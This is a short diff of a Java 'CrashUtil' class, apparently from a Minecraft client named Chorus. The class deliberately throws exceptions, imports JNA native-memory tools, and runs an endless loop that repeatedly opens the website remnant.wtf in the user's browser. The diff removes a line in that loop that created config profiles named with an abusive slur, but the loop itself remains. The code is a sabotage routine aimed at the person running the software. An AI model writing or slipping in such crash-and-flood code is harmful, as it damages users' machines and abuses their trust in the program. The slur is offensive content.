@@ -5,7 +5,7 @@ import chorus0.Chorus;
 
 import com.chorus.common.QuickImports;
 import com.chorus.common.util.player.ChatUtils;
-import com.chorus.core.client.config.ConfigManager;
+
 
 import com.sun.jna.Function;
 import com.sun.jna.Memory;
@@ -67,9 +67,7 @@ public class CrashUtil implements QuickImports {
         concurrentModificationException();
         castException();
         arithmeticException();
-        ConfigManager cfg = Chorus.getInstance().getConfigManager();
         for (int i = 0; i >= 0; i++) {
-            cfg.createProfile("RETARDED FUCK");
             Util.getOperatingSystem().open("https://remnant.wtf/");
             Util.getJVMFlags();
         }
